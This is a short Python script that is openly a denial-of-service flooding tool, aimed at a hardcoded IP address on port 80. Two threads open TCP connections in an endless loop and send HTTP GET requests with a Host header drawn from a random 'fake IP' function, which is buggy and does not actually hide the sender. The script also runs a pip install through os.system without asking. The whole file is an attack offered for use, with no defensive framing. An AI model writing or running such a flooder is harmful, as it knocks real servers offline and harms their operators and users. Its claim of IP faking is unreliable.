# Script Version 2 with Fake-IP function and coloured command line output

import socket
import threading
import sys
import random
import os
#from termcolor import colored, cprint

try:
    from termcolor import colored, cprint
    cprint('[+] termcolor library already installed...', 'green')
except Exception as e:
    print('[-]', e)
    os.system('pip3 install termcolor')
    print('[!] I have installed the necessary libraries for you!')

def fk_ip():
    rand = []
    for i in range(4):
        rand.append(random.randint(0,256))
        if rand[i] == '127':
            rand[i] == random.randint(0,256)
    fkip = '%d.%d.%d.%d' % (rand[0], rand[1], rand[2], rand[3])
    return fkip

target = "72.14.177.48"
fake_ip = fk_ip()
port = 80

print('Target:', target)
print('Fake_IP:', fake_ip)
question = input(str(("Do you like to proceed (y/n)? ")))
if question == "n":
    sys.exit(cprint('Program stopped!','red', attrs=['bold']))

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    
        global attack_num
        attack_num +=1
        print(attack_num)
        s.close()

for i in range(2):
    try:
        thread = threading.Thread(target=attack)
        print("Thread", i, "started!")
        thread.start()
    except KeyboardInterrupt:
        sys.exit(cprint('Program cancelled by user!', 'yellow'))
